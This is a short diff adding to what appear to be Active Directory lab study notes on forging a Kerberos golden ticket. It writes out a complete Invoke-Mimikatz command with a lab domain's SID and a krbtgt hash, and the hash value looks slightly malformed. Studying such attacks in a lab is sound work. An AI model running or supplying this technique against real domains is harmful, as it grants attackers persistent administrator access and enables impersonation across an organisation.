@@ -14,4 +14,6 @@
 # AFTER compromising the krbtgt password hash, we can use mimikatz or impacket to forge Kerberos tickets.
 # Here I'll use the golden ticket to create a Kerberos ticket-granting ticket (TGT).
 # Because the root of trust in Kerberos is the krbtgt password hash, this TGT is considered fully valid.
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff47a9d8bd66ce7efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 
+This way we get a proccess running as admin in the current cmd after getting krbtgt ntlm hash without DA privileges.
